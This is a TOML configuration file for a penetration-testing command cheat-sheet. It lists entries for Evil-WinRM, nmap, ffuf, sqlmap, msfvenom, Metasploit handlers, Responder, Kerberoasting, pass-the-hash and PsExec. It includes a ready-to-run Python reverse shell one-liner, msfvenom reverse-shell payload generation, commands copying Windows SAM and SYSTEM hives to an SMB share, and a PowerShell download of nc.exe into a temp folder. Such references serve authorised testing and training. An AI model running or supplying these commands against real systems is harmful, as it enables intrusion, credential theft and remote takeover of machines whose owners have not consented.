title = "Pentest commands"

# Basic configurations
max_events = 100
destination = "127.0.0.1"


# ============================ #
#                              #
#         ALL COMMANDS         #
#                              #
# ============================ #

# ===== NETWORK COMMANDS ===== #
# ============================ #

[command.Evil-WinRM]
name_exe = "evil-winrm"
cmd_types = "network"
args = "-i <ip|127.0.0.1> -u <username> -p <password>"
short_desc = "Connect to an Windows machine using WinRM protocol"
details = """
Few problem may occur with this tool, then do: `export OPENSSL_CONF=/home/user/evilwinrm.conf` 

This file (.conf) must contains this:
```
openssl_conf = openssl_init
[openssl_init]
providers = provider_sect
[provider_sect]
default = default_sect
legacy = legacy_sect
[default_sect]
activate = 1
[legacy_sect]
activate = 1
```"""
examples = [
    "evil-winrm -i 127.0.0.1 -u 'domain/username' -p 'password'"
]

[command.Remmina]
name_exe = "remmina"
cmd_types = "network"
args = "-c rdp://<user:password>@<ip|127.0.0.1>"
short_desc = "Connect with GUI to an Windows machine with RDP protocol."
examples = [
    "remmina -c rdp://user:password@127.0.0.1"
]

[command.XfreeRDP-0]
name_exe = "xfreerdp"
cmd_types = "network"
args = "/cert:<status|ignore> /d:<domain|corp.local> /u:<user> /p:<password> /v:<ip|127.0.0.1> /dynamic-resolution"
short_desc = "Connect with GUI to an Windows machine with RDP protocol."
examples = [
    "xfreerdp /u:user /p:password /v:127.0.0.1"
]

[command.XfreeRDP-1]
name_exe = "xfreerdp"
cmd_types = "network"
args = "/cert:<status|ignore> /compression /auto-reconnect /dynamic-resolution /d:<domain|corp.local> /u:<user> /p:<password> /v:<ip|127.0.0.1> /drive:<share-drive-name|share>,<share-local-folder|/tmp/shared>"
short_desc = "Connect with GUI to an Windows machine with RDP protocol and mount share drive."
examples = [
    "xfreerdp /cert-ignore /compression /auto-reconnect /dynamic-resolution /d:corp.local /u:user /p:password /v:127.0.0.1 /drive:share,/tmp/shared"
]


[command.PwSh0]
name_exe = "pwsh-preview"
cmd_types = "misc"
args = "-c '[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"<command>\"))'"
short_desc = "Convert command to Base64String with PowerShell."
examples = [
    "pwsh-preview -c 'Convert::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"ping 127.0.0.1\"))'"
]

[command.SSH]
name_exe = "ssh"
cmd_types = "network"
args = "-o 'UserKnownHostsFile=/dev/null' -o 'StrictHostKeyChecking=no' -o 'Loglevel=QUIET' <conn|user@127.0.0.1>"
short_desc = "Connect with SSH without saving nor checking known host."
examples = [
    "ssh -o 'UserKnownHostsFile=/dev/null' -o 'StrictHostKeyChecking=no' -o 'Loglevel=QUIET' user@127.0.0.1"
]

[command.SMBConnect]
name_exe = "smbserver.py"
cmd_types = "network"
args = "<share_name|test> <share_path|/tmp/share/> -smb2support  -username <user|user> -password <password|password>"
short_desc = "Open an SMB server for multi-purpose actions"
details = """
net use \\\\127.0.0.1\\test /user:test test
copy SAM \\\\127.0.0.1\\test\\SAM
copy SYSTEM \\\\127.0.0.1\\test\\SYSTEM
"""
examples = [
    "sudo smbserver.py test /tmp/share/ -smb2support  -username test -password test"
]

[command.PowerShell-Download]
name_exe = "powershell wget"
cmd_types = "network"
args = "-Uri http://<ip|127.0.0.1>/<file> -OutFile <ofile|C:/Windows/Temp/f.exe>"
short_desc = "Download file from Windows PowerShell"
examples = [
    "powershell wget -Uri http://127.0.0.1/nc.exe -OutFile C:/Windows/Temp/nc.exe"
]


# ===== SYSADMIN COMMANDS =====
# ============================ #

[command.UpgradeShell]
name_exe = "python3"
cmd_types = "sysadmin"
short_desc = "Upgrade shell for more flexibility"
args = "-c 'import pty; pty.spawn(\"/bin/bash\")'"
examples = [
    "python3 -c 'import os; os.system(\"/bin/bash -p\")'",
    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
]

[command.Capabilities]
name_exe = "getcap"
cmd_types = "sysadmin"
short_desc = "Search binaries with capabilities (often require sudo)"
details = "..."
args = "-r / 2>/dev/null"
examples = [
    "sudo getcap -r / 2>/dev/null",
    "sudo getcap /usr/bin/ping"
]

[command.IP]
name_exe = "ip"
cmd_types = "sysadmin"
short_desc = "Put up/down an interface"
args = "link set dev <interface> <status|down>"
examples = [
    "link set dev eth0 down",
    "link set dev eth0 up"
]

[command.UFW]
name_exe = "ufw"
cmd_types = "sysadmin"
short_desc = "Allow ip to contacted our machine"
args = "allow from <target>"
examples = [
    "ufw allow from 192.168.0.101"
]

[command.Icacls]
name_exe = "icacls"
cmd_types = "sysadmin"
short_desc = "Check file/folder permission for users"
args = "<path>"

[command.MySQL]
name_exe = "mysql"
cmd_types = "sysadmin"
short_desc = "Connect to a mysql database"
args = "-u <username|root> -p<password> -P <port|3306> --host <ip|127.0.0.1> <dbname>"
examples = [
    "mysql -u root -p user -P pass --host 127.0.0.1 bddname"
]

[command.Windows-Service]
name_exe = "Get-CimInstance"
cmd_types = "sysadmin"
short_desc = "List All Windows Services"
args = "-ClassName win32_service | Select PathName,Name,State,StartName,StartMode"
examples = [
    "Get-CimInstance -ClassName win32_service | Select PathName,Name,State,StartName,StartMode",
    "Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.State -like 'Running'}",
    "Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}"
]

[command.Tee]
name_exe = "tee"
cmd_types = "sysadmin"
short_desc = "Add new entry to known hosts"
args = "echo '<ip|127.0.0.1> example.local' | sudo tee /etc/hosts -a"
examples = [
    "echo '127.0.0.1 example.local' | sudo tee /etc/hosts -a"
]

# ===== PENTEST COMMANDS =====
# ============================ #

[command.Nmap-All-Port-Scan]
name_exe = "nmap"
cmd_types = "pentest|network"
short_desc = "Scanning all ports with SYN scan and saving in file"
args = "-n -sV -sS -Pn -p- -oN <output_file|scan.txt> <destination|127.0.0.1>"
examples = [
    "nmap -sV -sS -Pn -p- -oN scan.nmap 127.0.0.1"
]

[command.Nmap-Version-Script]
name_exe = "nmap"
cmd_types = "pentest|network"
short_desc = "Version -sV, default script -sC"
args = "-n -sC -sV <ip|127.0.0.1>"
examples = [
    "nmap -sC -sV 127.0.0.1",
    "nmap -sV -p 443 --script 'vuln'"
]

[command.Nmap-SMB-OS-Discovery]
name_exe = "nmap"
cmd_types = "pentest|network"
short_desc = "SMB OS discovery"
args = "-n -p139,445 --script smb-os-discovery <ip|127.0.0.1>"
examples = [
    "nmap -n -p139,445 --script smb-os-discovery  127.0.0.1"
]

[command.Nmap-UDP-Scan]
name_exe = "nmap"
cmd_types = "pentest|network"
short_desc = "Full UDP Scan"
args = "-sS -sU -p- <ip|127.0.0.1> -oN scan-udp.txt"
examples = [
    "nmap -sS -sU -p- -T4 --min-rate 1000 127.0.0.1 -oN scan-udp.txt"
]

[command.DNSEnum]
name_exe = "dnsenum"
cmd_types = "pentest|network"
short_desc = "DNS Enumeration"
args = "<hostname>"
examples = [
    "dnsenum example.com"
]

[command.Enum4Linux]
name_exe = "enum4linux"
cmd_types = "pentest|network"
short_desc = "SMB Enumeration"
args = "<hostname>"
examples = [
    "enum4linux example.com"
]

[command.OneSixtyOne]
name_exe = "onesixtyone"
cmd_types = "pentest|network"
short_desc = "SNMP Bruteforce Attack"
args = "-c <communities_file> -i <ips_file>"
examples = [
    "onesixtyone -c communities.txt -i ips.txt"
]

[command.SNMPWalk]
name_exe = "snmpwalk"
cmd_types = "pentest|network"
short_desc = "SNMP Enumeration"
args = "-c <community|public> -v1 -t 10 <ip|127.0.0.1> -Oa"
examples = [
    "snmpwalk -c public -v1 -t 10 127.0.0.1 -Oa # Enumerate entire MIB Tree (-Oa: used to decode hexadecimal)",
    "snmpwalk -c public -v1 127.0.0.1 1.3.6.1.4.1.77.1.2.25  # Enumerate all users on the Windows machine",
    "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2  # List all machine running processes",
    "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2  # List all machine installed softwares",
    "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3  # List all machine TCP listening ports"
]

[command.Host]
name_exe = "host"
cmd_types = "pentest|network"
short_desc = "DNS Enumeration with type handling"
args = "-t <type|any> <hostname>"
examples = [
    "dnsenum -t mx example.com"
]

[command.FFUF-0]
name_exe = "ffuf"
cmd_types = "pentest"
short_desc = "Bruteforce website"
details = """Brutforce directory, FUZZ keyword is mandatory and a `/` at the end also otherwise it's not gonna work.
There is also a filter response size to avoid false positives.
"""
args = "-w <list_path|file.txt> -u http://<url|localhost>/FUZZ/ -t 100 -fs <response-size|1000>"
examples = [
    "ffuf -u http://localhost/FUZZ/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -fs 1000"
]

[command.FFUF-1]
name_exe = "ffuf"
cmd_types = "pentest"
short_desc = "Bruteforce subdomain"
args = "-w <list_path|file.txt:FHOST> -u <url|http://localhost/> -H <header|'Host:FHOST.localhost'> -t 100"
examples = [
    "ffuf -w '/opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FHOST' -u 'http://localhost/' -H 'Host:FHOST.localhost' -t 100"
]

[command.SQLMap]
name_exe = "sqlmap"
cmd_types = "pentest"
short_desc = "SQL injection of username/password"
args = "-u <url|'http://127.0.0.1/login'> --data <data|'username=admin&password=password'>"
examples = [
    "sqlmap -u 'http://searcher.htb/search' --data 'username=admin&password=password'"
]

[command.Dirb]
name_exe = "dirb"
cmd_types = "pentest"
short_desc = "Bruteforce url paths"
args = "<url|http://127.0.0.1/> <list>"
examples = [
    "dirb http://10.10.11.242/ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt"
]

[command.Gobuster]
name_exe = "gobuster"
cmd_types = "pentest"
short_desc = "Bruteforce url paths with blacklist status code"
args = "dir -u <ip|127.0.0.1> -w <list.txt|/opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt> -t 5 --status-codes-blacklist <code|404>"
examples = [
    "gobuster dir -u 127.0.0.1 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 --status-codes-blacklist 404,301"
]

[command.Find]
name_exe = "find"
cmd_types = "pentest|sysadmin"
short_desc = "Find binaries with SUID bit set"
args = "/ -perm -4000 2> /dev/null"
examples = [
    "find / -perm -4000 2> /dev/null"
]

[command.Msfvenom]
name_exe = "msfvenom"
cmd_types = "pentest"
short_desc = "Create reverse shell tcp"
args = "-p <payload|windows/shell_reverse_tcp> LHOST=<ip|127.0.0.1> LPORT=<port|4444> -f <type|exe> > reverse_tcp.exe"
examples = [
    "msfvenom -p payload|windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe > reverse_tcp.exe"
]

[command.Msfconsole]
name_exe = "msfconsole"
cmd_types = "pentest"
short_desc = "Handler reverse shell tcp"
args = "-q -x 'use exploit/multi/handler;set payload <PAYLOAD|windows/meterpreter/reverse_tcp> ;set LHOST <LHOST|127.0.0.1> ;set LPORT <LPORT|4444> ;run;'"
examples = [
    "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 127.0.0.1;set LPORT 4444;run;'"
]

[command.Hashcat]
name_exe = "hashcat"
cmd_types = "pentest"
short_desc = "Cracking hashes software"
details = """
Crack password of a chosen <type>.
This can be combined with hashid to find type of hash:
$ hashid <hash>"""
args = "-m <type> <hashfile|hash.txt> <wordlist|/usr/share/wordlists/rockyou.txt>"
examples = [
    "hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt"
]

[command.PsPy64s0]
name_exe = "pspy64s"
cmd_types = "pentest"
short_desc = "Check on processes during execution"
details = """
Pspy is a command line tool designed to snoop on processes without need for root permissions.
It allows you to see commands run by other users, cron jobs, etc. as they execute."""
args = "-i <milli|100>"
examples = [
    "pspy64s -i 100"
]

[command.Nmap-3]
name_exe = "cat"
cmd_types = "sysadmin"
short_desc = ""
details = """
Search in the nmap NSE scripts for vuln (can search the impact of the script - safe/intrusive).
There is also an example of reloading the script.db file if a new '.nse' file was added."""
args = "/usr/share/nmap/scripts/script.db | grep '<search|safe>'"
examples = [
    "cat /usr/share/nmap/scripts/script.db | grep 'vuln'",
    "nmap --script-updatedb"
]

[command.LDAPDomainDump]
name_exe = "ldapdomaindump"
cmd_types = "pentest"
short_desc = "Dump LDAP information"
args = "-u '<DOMAIN/user|CORP.local/user>' -p '<LM:NTLM>' -at NTLM ldap://<ip|127.0.0.1>"
examples = [
    "ldapdomaindump -u 'CORP.local/user' -p 'ba0ecf3dcda348e7a91e548719c3ac6e:12943dbced43cd06a0445dd11fac3a7d' -at NTLM ldap://127.0.0.1"
]

[command.CrackMapExec]
name_exe = "crackmapexec"
cmd_types = "pentest"
short_desc = "List shares on list of machines"
args = "smb <ipsfile|ips.txt> -u <username> -H <NTHASH> --shares"
examples = [
    "crackmapexec smb ips.txt -u user -H <NTHASH> --shares"
]

[command.NetExec]
name_exe = "netexec"
cmd_types = "pentest"
short_desc = "Show access on list of machines"
args = "smb <ipsfile|ips.txt> -u <username> -p <password|password>"
examples = [
    "netexec smb ips.txt -u user -p 'password' -d corp.com"
]

[command.SMBClient-0]
name_exe = "smbclient.py"
cmd_types = "pentest"
short_desc = "Setup an smb share"
args = "<share|c> <path|./>"
examples = [
    "smbclient.py c ./"
]

[command.SMBClient-1]
name_exe = "smbclient"
cmd_types = "pentest"
args = "-L //<ip|127.0.0.1>/ -U <user> --password=<password>"
examples = [
    "smbclient -L //127.0.0.1/ -U user --password=adminpass"
]

[command.HTTPServer]
name_exe = "python3"
cmd_types = "pentest"
short_desc = "Setup an HTTP server"
args = "-m http.server --bind <ip|127.0.0.1> <port|8000>"
examples = [
    "python3 -m http.server --bind 127.0.0.1 8000"
]

[command.Responder]
name_exe = "python3"
cmd_types = "pentest"
short_desc = "Gather NTHASH on network"
args = "Responder.py -I <local-interface> -i <ip|127.0.0.1>"
examples = [
    "sudo python3 Responder.py -I enp0s3 -i 192.168.3.85"
]

[command.MSSQLClient]
name_exe = "python3"
cmd_types = "pentest"
short_desc = "Connect to a MSSQL database instance"
args = "mssqlclient.py <username:password@ip|sa:pass@127.0.0.1> -db <dbname>"
examples = [
    "mssqlclient.py sa:password@127.0.0.1 -db database"
]

[command.ConnectBack]
name_exe = "python3"
cmd_types = "pentest|network"
short_desc = "Connect back and spawn a clean terminal with python subprocess"
args = "-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\" <ip|127.0.0.1> \", <port|4444> ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
examples = [
    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
]

[command.GetNPUsers]
name_exe = "impacket-GetNPUsers"
cmd_types = "pentest|network"
short_desc = "Request TGT from DC to later crack it. Only works if Kerberos pre-authentication is not activated!"
args = "-dc-ip <dc-ip|127.0.0.1>  -request -outputfile <outputfile|hashes-asrep.roast> <domain|corp.com/user>"
examples = [
    "impacket-GetNPUsers -dc-ip 127.0.0.1  -request -outputfile hashes-asrep.roast corp.com/user"
]

[command.Rubeus]
name_exe = "Rubeus.exe"
cmd_types = "pentest|network"
short_desc = "Request a TGS and try to crack the service account password"
args = ".\\Rubeus.exe kerberoast /outfile:<outfile|hashes.kerberoast>"
examples = [
    ".\\Rubeus.exe kerberoast /outfile:hashes.kerberoast"
]

[command.PsExec-Impacket]
name_exe = "psexec.py"
cmd_types = "pentest"
short_desc = "PsExec info"
args = "'<username|corp.com/user>:<password|password>@<ip|127.0.0.1>'"
examples = [
    "psexec.py 'corp.com/user:password@127.0.0.1'"
]

[command.WMIExec-Impacket]
name_exe = "wmiexec.py"
cmd_types = "pentest"
short_desc = "WMIExec info"
args = "'<username|corp.com/user>:<password|password>@<ip|127.0.0.1>'"
examples = [
    "wmiexec.py 'corp.com/user:password@127.0.0.1'"
]

[command.PsExec-Windows]
name_exe = "./PsExec64.exe"
cmd_types = "pentest"
short_desc = "PsExec info"
args = "-i  \\\\<machine|127.0.0.1> -u <username|corp\\jen> -p <password|password> cmd"
examples = [
    "./PsExec64.exe -i  \\\\FILES04 -u corp\\jen -p Nexus123! cmd"
]

# ===== REVERSE COMMANDS =====
# ============================ #

[command.Objdump]
name_exe = "objdump"
cmd_types = "reverse"
short_desc = "Display information from the binary in <type> format"
args = "-D <binary> -M <type|intel>"
examples = [
    "obdjump -M intel -D bin",
    "objdump -dj .rodata loop -M intel"
]
